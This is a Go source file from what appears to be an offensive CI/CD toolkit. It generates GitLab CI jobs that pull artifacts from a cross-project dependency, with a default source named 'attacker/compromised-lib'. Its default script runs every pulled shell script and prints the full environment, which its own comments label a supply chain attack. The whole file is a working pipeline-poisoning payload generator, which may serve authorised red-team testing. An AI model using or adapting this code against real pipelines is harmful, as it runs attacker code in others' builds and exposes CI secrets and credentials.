package payloads

import (
	"fmt"
	"strings"
)

// NeedsProjectOptions configures a needs:project artifact injection payload.
type NeedsProjectOptions struct {
	Common        CommonOptions
	SourceProject string   // compromised project path
	SourceRef     string   // branch/tag (default: "main")
	SourceJob     string   // job that produces artifacts
	ArtifactPaths []string // files to pull
	PoisonScript  string   // script to run with pulled artifacts
}

// GenerateNeedsProjectYAML generates a CI job that pulls artifacts from a
// cross-project dependency via needs:project, enabling supply chain injection.
func GenerateNeedsProjectYAML(o NeedsProjectOptions) string {
	name, stage := o.Common.defaults("supply-chain")
	if o.SourceProject == "" {
		o.SourceProject = "attacker/compromised-lib"
	}
	if o.SourceRef == "" {
		o.SourceRef = "main"
	}
	if o.SourceJob == "" {
		o.SourceJob = "build"
	}
	if strings.TrimSpace(o.PoisonScript) == "" {
		o.PoisonScript = buildDefaultNeedsScript()
	}

	return fmt.Sprintf(`stages: [%s]

%s:
  stage: %s%s%s
  needs:
    - project: %s
      job: %s
      ref: %s
      artifacts: true
  script:
    - |
%s
  allow_failure: true%s
`, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		o.SourceProject, o.SourceJob, o.SourceRef,
		indentBlock(strings.TrimSpace(o.PoisonScript), 6),
		rulesManual(o.Common.Manual))
}

func buildDefaultNeedsScript() string {
	return `_EXPLOIT() {
  echo "=== Cross-project artifacts pulled ==="
  ls -la || true
  find . -type f -name "*.sh" -o -name "*.py" -o -name "*.js" | head -20 || true

  # Execute any pulled scripts (supply chain attack)
  for script in *.sh; do
    [ -f "$script" ] && chmod +x "$script" && ./"$script" || true
  done

  # Dump environment alongside pulled artifacts
  printenv | sort || true
}
_EXPLOIT || true`
}
